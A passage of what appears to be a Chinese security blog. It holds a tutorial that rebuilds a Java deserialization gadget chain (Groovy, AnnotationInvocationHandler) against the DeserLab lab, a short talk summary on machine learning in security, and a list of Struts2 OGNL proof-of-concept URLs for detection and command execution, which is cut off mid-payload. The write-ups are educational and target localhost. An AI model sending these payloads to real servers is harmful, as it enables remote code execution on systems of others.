31636, seq 2, length 64</div></pre></td></tr></table></figure></p>
<p>我们已经成功地利用了DeserLab。接下来两个部分，我们希望能更好地了解我们发送到DeserLab的payload。</p>
<p>###手动创建payload<br>了解我们的payload的最好的方法是自己重建完全相同的payload，是的，这意味着写java代码。但问题是我们从哪里开始？我们可以像我们在看pcap时一样看看序列化payload。下面的代码将payload转换为十六进制字符串，我们可以使用SerializationDumper或者jdeserialize分析文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">open(<span class="string">'payload.bin'</span>,<span class="string">'rb'</span>).<span class="built_in">read</span>().encode(<span class="string">'hex</span></div></pre></td></tr></table></figure></p>
<p>所以让我们来详细了解一下，在具体情况下，如何运作。当然，在找出这一切后，你发现了一个已经描述它的页面，所以你可以跳过这个部分，阅读<a href="https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical" target="_blank" rel="external">这个</a>。本节的其余部分将着重于我的方法。我的方法的重要支柱之一也在阅读这个漏洞的ysoserial实现的根源。我不会不断提到，但如果你想知道我是如何计算出流量的，那是由于读取ysoserial实现的。<br>通过这些工具放置有效载荷后，在这两种情况下，都会产生很多Java类的很长的输出。要注意的主要类名是输出“sun.reflect.annotation.AnnotationInvocationHandler”的第一个。这个类可能看起来很熟悉，因为它似乎是大量反序列化漏洞的入门点。引起我注意的其他事情是“java.lang.reflect.Proxy”，“org.codehaus.groovy.runtime.ConvertedClosure”和“org.codehaus.groovy.runtime.MethodClosure”。他们引起了我注意的原因是因为他们引用了我们用于开发的库，以及从线上文章中已知的类来解释Java反序列化漏洞并与我在ysoserial源中看到的类匹配。<br>有一个重要的概念，你需要注意，事实上，当你执行反序列化攻击时，你发送一个对象的“保存”状态说话。这意味着你完全依赖于接收方的行为，更具体地说，你依赖于“保存”状态反序列化时所采取的操作。这意味着如果对方不调用发送对象的任何方法，则不会执行远程代码。这意味着你唯一的影响是设置你发送的对象的属性。现在这个概念很清楚，这意味着我们发送的第一个类应该有一个自动调用的方法，如果我们要实现代码执行，这解释了为什么第一类是如此特别。如果我们看看AnnotationInvocationHandler的代码，我们可以看到构造函数接受一个java.util.map对象，并且方法readObject调用Map对象上的一个方法。像你可能从阅读其他文章可以知道，当流被反序列化时，readObject被自动调用。我们开始构建我们自己的漏洞利用，基于这些信息，并从多个其他文章（在本文末尾引用的代码中）借鉴代码，我们创建以下内容。如果你想了解代码读取反思。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//this is the first class that will be deserialized</div><div class="line">String classToSerialize = <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>;</div><div class="line">//access the constructor of the AnnotationInvocationHandler class</div><div class="line">final Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];</div><div class="line">//normally the constructor is not accessible, so we need to make it accessible</div><div class="line">constructor.setAccessible(<span class="literal">true</span>);</div></pre></td></tr></table></figure></p>
<p>这通常是我有时花了几个小时调试和阅读我不知道的所有事情的部分，因为如果你尝试编译这个很好，你会学到很多.所以这里是你可以编译的代码段：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">//regular imports</div><div class="line">import java.io.IOException;</div><div class="line"></div><div class="line">//reflection imports</div><div class="line">import java.lang.reflect.Constructor;</div><div class="line"></div><div class="line">public class ManualPayloadGenerateBlog&#123;</div><div class="line"> public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</div><div class="line"> //this is the first class that will be deserialized</div><div class="line"> String classToSerialize = <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>;</div><div class="line"> //access the constructor of the AnnotationInvocationHandler class</div><div class="line"> final Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];</div><div class="line"> //normally the constructor is not accessible, so we need to make it accessible</div><div class="line"> constructor.setAccessible(<span class="literal">true</span>);</div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>你可以使用以下命令来编译和运行代码，即使它不会执行任何操作：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">javac ManualPayloadGenerateBlog</div><div class="line">java ManualPayloadGenerateBlog</div></pre></td></tr></table></figure></p>
<p>当你扩展此代码时，请记住以下内容：<br>google打印的错误代码<br>类名应等于文件名<br>知道有java 帮助<br>上述代码使初始入口点类可用，构造函数可访问，但是我们需要为构造函数提供哪些参数？大多数例子有以下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">constructor.newInstance(Override.class, map);</div></pre></td></tr></table></figure></p>
<p>我理解的’map’参数，就是在初始readObject调用期间调用’entrySet’方法的对象。我不明白第一个参数的内部工作原理，主要的一点是在readObject方法内部进行检查，以确保第一个参数的类型为“AnnotationType”。我们通过提供“AnnotationType”类型的buildin’Override’类来实现这一点。<br>现在我们来到有趣的部分，从’好的有道理’到’这是如何工作的’。要理解，重要的是要意识到第二个参数是一个Java代理对象，而不是一个简单的Java映射对象。这是什么意思？<a href="http://www.baeldung.com/java-dynamic-proxies" target="_blank" rel="external">这篇文章</a>很好的解释了Java动态代理，并提供了很好的代码示例，这是文章的引用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Dynamic proxies allow one single class with one single method to service multiple method calls to arbitrary classes with an arbitrary number of methods. A dynamic proxy can be thought of as a kind of Facade, but one that can pretend to be an implementation of any interface. Under the cover, it routes all method invocations to a single handler – the invoke() method.</div></pre></td></tr></table></figure></p>
<p>我理解的是，它是一个 Java map 对象，然后将所有调用原始的Map对象方法路由到另一个类的单一方法。让我们看看我们现在所了解的：<br><img src="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/flow.png" alt=""><br>这意味着我们可以尝试用这样一个Map对象来扩展我们的源代码，例如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">final Map map = (Map) Proxy.newProxyInstance(ManualPayloadGenerateBlog.class.getClassLoader(), new Class[] &#123;Map.class&#125;, &lt;unknown-invocationhandler&gt;);</div></pre></td></tr></table></figure></p>
<p>注意我们仍然需要适应的 invocationhandler，但我们没有。这是Groovy最终要适应的部分，因为直到现在我们仍然在常规Java类的领域。Groovy适合的原因是因为它有一个InvocationHandler。所以当InvocationHandler被调用时，最终会导致代码执行如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(<span class="string">"ping 127.0.0.1"</span>, <span class="string">"execute"</span>), <span class="string">"entrySet"</span>);</div><div class="line">final Map map = (Map) Proxy.newProxyInstance(ManualPayloadGenerateBlog.class.getClassLoader(), new Class[] &#123;Map.class&#125;, closure);</div></pre></td></tr></table></figure></p>
<p>就像你可以在上面的代码中看到的，我们现在终于有了invocationhandler，它就是ConvertedClosure对象。你可以通过反编译Groovy库来确认这一点，当你看到ConvertedClosure类时，你会看到它扩展了ConversionHandler类，如果你反编译该类你将看到：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">public abstract class ConversionHandler</div><div class="line">implements InvocationHandler, Serializable</div></pre></td></tr></table></figure></p>
<p> 实现InvocationHandler的事实解释了为什么我们可以在Proxy对象中使用它。然而，我不明白的一件事是，Groovy payload<br> 是从Map代理调用到实际代码执行的。您可以使用反编译器来查看Groovy库，但是通常我发现可以使用谷歌查询补充代码阅读来了解它。一个挑战<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">groovy execute shell <span class="built_in">command</span></div></pre></td></tr></table></figure></p>
<p> 上面的查询可能会让你在各种各样的页面上找到答案。这实质上告诉我们，显然String对象有一个额外的方法是“execute”。我经常使用上述查询来处理我不熟悉的环境，因为执行shell命令通常是开发人员需要的，通常可以在互联网上找到答案。这有助于我完整地了解这个payload的工作原理，现在可以看出如下关系：<br> <img src="https://raw.githubusercontent.com/wsygoogol/MarkdownPhotoes/master/flow.png" alt=""><br> 完整的代码在<a href="https://gist.github.com/DiabloHorn/44d91d3cbefa425b783a6849f23b8aa7" target="_blank" rel="external">这里</a>。编译，执行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">javac -cp DeserLab/DeserLab-v1.0/lib/groovy-all-2.3.9.jar ManualPayloadGenerate.java</div><div class="line">java -cp .:DeserLab/DeserLab-v1.0/lib/groovy-all-2.3.9.jar ManualPayloadGenerate &gt; payload_manual.bin</div></pre></td></tr></table></figure></p>
<p>当我们使用python exploit开发它时，它应该具有与ysoserial payload完全相同的结果。令我吃惊的是，payload甚至有相同的哈希：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sha256sum payload_ping_localhost.bin payload_manual.bin</div><div class="line">4c0420abc60129100e3601ba5426fc26d90f786ff7934fec38ba42e31cd58f07 payload_ping_localhost.bin</div><div class="line">4c0420abc60129100e3601ba5426fc26d90f786ff7934fec38ba42e31cd58f07 payload_manual.bin</div></pre></td></tr></table></figure></p>
<p>感谢您抽出时间阅读本文，更重要的是，我希望它可以帮助您利用Java反序列化漏洞以及更好地了解它们。<br>参考链接：<br><a href="https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical" target="_blank" rel="external">https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical</a><br><a href="https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/" target="_blank" rel="external">https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/</a><br><a href="https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html" target="_blank" rel="external">https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html</a><br><a href="http://gursevkalra.blogspot.nl/2016/01/ysoserial-commonscollections1-exploit.html" target="_blank" rel="external">http://gursevkalra.blogspot.nl/2016/01/ysoserial-commonscollections1-exploit.html</a><br><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/" target="_blank" rel="external">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a><br><a href="https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478" target="_blank" rel="external">https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478</a><br><a href="https://www.youtube.com/watch?v=VviY3O-euVQ" target="_blank" rel="external">https://www.youtube.com/watch?v=VviY3O-euVQ</a><br><a href="http://wouter.coekaerts.be/2015/annotationinvocationhandler" target="_blank" rel="external">http://wouter.coekaerts.be/2015/annotationinvocationhandler</a><br><a href="http://www.baeldung.com/java-dynamic-proxies" target="_blank" rel="external">http://www.baeldung.com/java-dynamic-proxies</a><br><a href="https://stackoverflow.com/questions/37068982/how-to-execute-shell-command-with-parameters-in-groovy" target="_blank" rel="external">https://stackoverflow.com/questions/37068982/how-to-execute-shell-command-with-parameters-in-groovy</a><br><a href="https://stackoverflow.com/questions/37628/what-is-reflection-and-why-is-it-useful" target="_blank" rel="external">https://stackoverflow.com/questions/37628/what-is-reflection-and-why-is-it-useful</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2017/09/12/Java反序列化漏洞利用的学习与实践/" data-id="cjbohpb4900077o1br9gw0yoo" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-机器学习再信息安全中的应用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/08/11/机器学习再信息安全中的应用/" class="article-date">
  <time datetime="2017-08-11T08:44:31.000Z" itemprop="datePublished">2017-08-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/08/11/机器学习再信息安全中的应用/">机器学习在信息安全中的应用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>前段时间听了一个”机器学习在信息安全中的应用”的讲座，应该是我今年听关于机器学习在信息安全中的应用的最好的一场，研究嘉宾是kkqq大神，后来自己又做了一些思考，在此做一个总结。<br>在和黑客对抗的过程中，面对的威胁有3个不同的认知程度：<br>1.已知的威胁。<br>2.已知的未知的威胁。<br>3.未知的未知的威胁。<br>很多时候，在做产品、做运营和做研究的时，最大的恐惧是面对一个最未知的恐惧；因为只要知道这个情况是已知的，有很多技术手段都是可以解决的。<br>首先我们说一下如何定义和衡量已知和未知。从安全角度来说比较容易：<br>已知的已知就是我如果在做一个产品，我自己每天能看见的，能检测到的；<br>已知的未知就是我自己看不见，也检测不到，但是友商们都有检测；<br>未知的未知确实就是我不知道，除非它发生了，被通过某些机缘巧合的情况下暴露了出来，这个情况下，才会换成我们所谓的已知的未知。<br>做安全的，不管是甲方还是乙方，面临同样的挑战，就是一个事情只要我知道，我所有的分析，所有的IOC，所有的威胁情报都能跟上去，但如果这个事情我不知道，那真是无从下手。<br>其实在每一个层次上面，我们也可以横向定义到我们的产品，我们的运营上面去，我们怎么样去衡量你是不是在这个层次上做得比较好。<br>首先，要解决的是效果问题。这些效果包括我的检出率、召回率、误报率，就是这些不同的指标。但是更重要的是运营的，我怎么去衡量。不管你做任何的系统，你如果一天摔给我1000个报警，那我绝对不可能响应的过来的，所以运营就是事件可响应的数量不能太多。<br>每一个攻击来的时候，如果你不知道它背后是谁，那你这个其实还是没有解决到根本的问题。<br>我们用这个效果运营和知己知彼来衡量你在每个维度上到底能做到什么样的程度。</p>
<h4 id="规则系统"><a href="#规则系统" class="headerlink" title="规则系统"></a>规则系统</h4><p>，我只需要写规则，我就能把这个问题解决掉。但是有一个坏处，严重依赖于安全专家，因为你要想把一个安全场景的检测逻辑转化到一个规则系统里面，你是需要人深入了解到清楚每一个环节。<br>规则系统，就是写规则嘛。它的误报率和检出率都是相对比较认可的，误报也是比较可控的，可运营的。我出了一个误报，我可以做到把这个规则删了就可以了，这样误报就没有了，不影响你整个架构。<br>存在的问题就是规则系统是严重依赖于你的专家的知识，天然的就限制了你的规则系统是基于被动响应的模式的，比如说杀毒软件，只有我有一个样本我才能写一套规则，而且要在过程中是严重依赖于分析师的。我们拿杀毒软件举例子，分析师说我需要确定一下这个家族有什么样的特征，为了很快的能做响应，它有很多烦琐的或者是特别重的自动化流程去做。<br>还是相对有一个好处，能很明确的告诉你，这是什么病毒，这个在有时候，尤其是在互联网企业做安全运营的时候是很重要的指标，因为我如果来了一个远控和我来了一个普通的刷流量的恶意软件，这个威胁程度在我们看来是不一样的。</p>
<h4 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h4><p>我有一个固定的数据集合集，我有一个模型套上去，我先做一个模型，然后我有检测结果。严重依赖与我们的安全专家，提供精确的数据标签。我需要不断的再把它的结果打上标签，再去逐步做验证，它其实是一个人工辅助的过程。<br>机器学习和以前的规则系统不大一样，以前的规则系统是安全研究员就能搞定的事情。但是在机器学习的场景下，是需要安全专家和数据科学家共同协作的。<br>其实在机器学习的场景下，你会发现安全专家起到的作用要比数据科学家要重一点，因为它里面有一个特征提取的过程，这个特征提取是很严重的依赖于你的专家先验知识的，这些特征提取是数据科学家解决不了的一个问题。<br>机器学习就是它在固定数据集的时候，效果特别好，输入、输出严格限定的话，效果绝对要比规则系统强很多。<br>数据处理要比你的规则系统要强，因为它是天然的和大数据这套东西都结合起来的。<br>但是第二个就有待商榷，它落地的时候这个误报率，第一步它在训练的时候那个指标特别好看，但是安全每天的形势都是在变的，今天你做的四个九、五个九的模型，明天来了一个新的东西，你会发现他以前没考虑到，有误报。这个误报就不是简单的0.001%的标准，很可能放大到一个你没有做运营的场景。<br>在一个规则系统里面，你如果要做误报，这个响应是相对比较容易的，我就删一条规则嘛，大不了加个强限制的的条件。机器学习的时候，你看这个模型是人一眼看上去理解不了的，需要很精确的、很深入的做关联，才能理解机器学习的模型，就意味着你不能通过一个简单的把一个分支改掉的方式解决问题，得需要把模型重新迭代一遍，迭代模型大家做过的都知道，周期是比较长的了。<br>最后一个是它的威胁分类比较困难。</p>
<h4 id="深度学习"><a href="#深度学习" class="headerlink" title="深度学习"></a>深度学习</h4><p>它在解决大局观的问题下，要比人的性能要好。那我们给它一个定位，它尝试在解决一个已知的未知的问题，它能比机器学习解决得更好。但是它也在尝试着突破未知的未知，这个可能比较难理解，我们后面也展开说一下。<br>它还是严重的依赖专家，给你提供一个初始的数据集用来做标签，用来做结果验证。但是你会明显感觉到，如果大家在说神经网络的时候，你会发现专家的分量降低了，算法和计算或者是模型的层次会变高了。那就变成一个数据科学家主导的过程，而不是专家主导的过程，专家更多是去辅助验证这个模型。<br>深度学习和机器学习都有同样的问题，但是因为它的更不可控性或者是更不理解性，所以就造成了和机器学习有同样的问题，但是会相对比更严重。</p>
<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><p>特定场景的检测，就是固定输入输出，有固定的规则系统。在固定场景的情况下，还是有很大的潜力去发现已知的未知，甚至于去发现一些未知的未知，这些特定场景我们前面也提到了有一些问题，比如说误报的问题、漏报的问题，也是通过一个运营的方式去解决，但是运营的方和我们以前常见的不一样，我们杀毒软件来了误报了以后，我们都是分析师去处理的，但是在机器学习、人工智能这个大框架下，是通过数据密集型的逻辑去解决的。<br>多维度中的一个维度，因为我们前面提到的，机器学习和深度学习最大的问题可能在落地的时候是有误报的问题和时效性的问题，在泛安全的场景下，其实还有很多场景不需要这么强的对误报的容忍度或者是漏报的容忍度那么低的。而且在大的体系下是只依赖于一个东西做某些程度的决策，而不是要求你做百分百的决策。<br>实时对抗性没那么强。这些场景大家都相对比较熟悉了，就是风控，风控包括人脸识别、用户粗向、策略模型，你会发现在某一个子方向上确实没有程度做到一个我们可以直接拿过来做单一维度的对抗手段，但是你把所有的这些东西综合在一起，因为风控讲的是可控，我们如果是搞攻防对抗的，你有一起安全事故很可能被搞了，但是风控在大的场景下，只有一个百分比的用户的损失是可以接受的，我就是相对比较成功的，所以在这种场景应用是很成功的。<br>威胁情报，很多人可能喜欢把威胁情报归到检测里面去，但是我觉得不是，它主要还是解决知己知彼的问题，在知己知彼的场景下，它其实是可以通过人工后期确认的方式，来达到你要的效果。所以在这个场景下它也没有那么高的实时对抗性的误报的要求。<br>最常见的，后台数据处理，批量数据分析包括聚类、分类这些应用，可能每家都有很成功的应用。</p>
<h4 id="未知的未知"><a href="#未知的未知" class="headerlink" title="未知的未知"></a>未知的未知</h4><p>未知的未知我们到底怎么解决，是我们现在相对比较前沿的在人工智能方向上的一个，AlphaGo里面用的那套模型，就是Reinforcement  Learning，里面有一个反馈机制，我觉得人工智能的路还很长，但是这些跬步都是一步步积累下来的，我们虽然看不到人工智能在信息安全或者是其他行业的终局，但是能看到的就是Reinforcement  Learning在下一步的人工智能里面相对迭代效果还不错的。<br>如果要落地的话，你会发现数据的重要性远远大于其他所有方面。<br>没有数据就没有大数据，没有大数据就没有人工智能，也没有机器学习。<br>模型，大家有时候可能觉得模型和算法是一套东西，模型在我们的概念就是一个威胁场景，必须要定义好你要解决什么样的问题，在这种情况下用算法适配，而不是反过来。所以我们自己的概念是说数据大于模型，模型大于算法。我们自己切身的体验是，你如果按照这个走的话，你的落地的效果肯定会多一些。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2017/08/11/机器学习再信息安全中的应用/" data-id="cjbohpb4m000h7o1bgp6jnbyp" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-解密Struts2-POC" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/07/18/解密Struts2-POC/" class="article-date">
  <time datetime="2017-07-18T07:44:42.000Z" itemprop="datePublished">2017-07-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/07/18/解密Struts2-POC/">解密Struts2 POC</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>struts的威力大家都知道，这里找几个有代表性的POC讲一下，做一个记录。</p>
<p>#####回显POC<br>poc1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\43_memberAccess.allowStaticMethodAccess'</span>)(a)=<span class="literal">true</span>&amp;(b)((<span class="string">'\43context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\75false'</span>)(b))&amp;(<span class="string">'\43c'</span>)((<span class="string">'\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET'</span>)(c))&amp;(g)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i2)((<span class="string">'\43xman.getWriter().println(%22[/ok]%22)'</span>)(d))&amp;(i99)((<span class="string">'\43xman.getWriter().close()'</span>)(d))</div></pre></td></tr></table></figure></p>
<p>poc2（类型转换漏洞需要把POC加在整型参数上）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22))%2b'</span></div></pre></td></tr></table></figure></p>
<p>poc3（需要注意这里也必须是加载一个String(字符串类型)的参数后面，使用的时候把URL里面的两个foo替换成目标参数（注意POC里面还有个foo））:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?foo=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess[%22allowStaticMethodAccess%22]=new%20java.lang.Boolean(<span class="literal">true</span>),@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22))&amp;z[(foo)(<span class="string">'meh'</span>)]=<span class="literal">true</span></div></pre></td></tr></table></figure></p>
<p>poc4<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=<span class="literal">true</span>,%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23s3cur1ty.println(%22[/ok]%22),%23s3cur1ty.close())(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]</div></pre></td></tr></table></figure></p>
<p>poc5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23response=@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22),%23response.close()&#125;</span></div></pre></td></tr></table></figure></p>
<p>poc6<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/$%7B%23_memberAccess[%22allowStaticMethodAccess%22]=<span class="literal">true</span>,%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23resp.println(%22[ok]%22),%23resp.close()%7D.action</div></pre></td></tr></table></figure></p>
<p>poc7<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/Struts2/test.action?redirect:<span class="variable">$&#123;%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.println('[/ok]'),%23w.flush(),%23w.close()&#125;</span></div></pre></td></tr></table></figure></p>
<p>@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22)其实是静态调用ServletActionContext; ServletActionContext能够拿到真正的HttpServletRequest、HttpServletResponse、ServletContext。拿到一个HttpServletResponse响应对象后就可以调用getWriter方法(返回的是PrintWriter)让Servlet容器上输出[/ok]了，而其他的POC也都做了同样的事：拿到HttpServletResponse，然后输出[/ok]。其中的allowStaticMethodAccess在Struts2里面默认是false，也就是默认不允许静态方法调用。</p>
<p>#####精确判断是否存在（延迟判断）:<br>poc1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\43_memberAccess.allowStaticMethodAccess'</span>)(a)=<span class="literal">true</span>&amp;(b)((<span class="string">'\43context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\75false'</span>)(b))&amp;(<span class="string">'\43c'</span>)((<span class="string">'\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET'</span>)(c))&amp;(d)((<span class="string">'@java.lang.Thread@sleep(5000)'</span>)(d))</div></pre></td></tr></table></figure></p>
<p>poc2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000))%2b'</span></div></pre></td></tr></table></figure></p>
<p>poc3<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,@java.lang.Thread@sleep(5000))(meh%29&amp;z[%28foo%29%28%27meh%27%29]=<span class="literal">true</span></div></pre></td></tr></table></figure></p>
<p>poc4<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d+new+java.lang.Boolean(<span class="literal">false</span>)%2c+%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c+%23a%3d%40java.lang.Thread@sleep(5000))(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]</div></pre></td></tr></table></figure></p>
<p>poc5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000)&#125;</span></div></pre></td></tr></table></figure></p>
<p>poc6<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000)&#125;</span>.action</div></pre></td></tr></table></figure></p>
<p>之前很多的利用工具都是让线程睡一段时间再去计算时间差来判断漏洞是否存在。这样比之前的回显更靠谱，缺点就是慢。而实现这个POC的方法同样是非常的简单其实就是静态调用java.lang.Thread.sleep(5000)就行了。而命令执行原理也是一样的。</p>
<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>关于回显：webStr\75new\40byte[100] 修改为合适的长度。<br>poc1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\43_memberAccess.allowStaticMethodAccess'</span>)(a)=<span class="literal">true</span>&amp;(b)((<span class="string">'\43context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\75false'</span>)(b))&amp;(<span class="string">'\43c'</span>)((<span class="string">'\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET'</span>)(c))&amp;(g)((<span class="string">'\43req\75@org.apache.struts2.ServletActionContext@getRequest()'</span>)(d))&amp;(h)((<span class="string">'\43webRootzpro\75@java.lang.Runtime@getRuntime().exec(\43req.getParameter(%22cmd%22))'</span>)(d))&amp;(i)((<span class="string">'\43webRootzproreader\75new\40java.io.DataInputStream(\43webRootzpro.getInputStream())'</span>)(d))&amp;(i01)((<span class="string">'\43webStr\75new\40byte[100]'</span>)(d))&amp;(i1)((<span class="string">'\43webRootzproreader.readFully(\43webStr)'</span>)(d))&amp;(i111)(<span class="string">'\43webStr12\75new\40java.lang.String(\43webStr)'</span>)(d))&amp;(i2)((<span 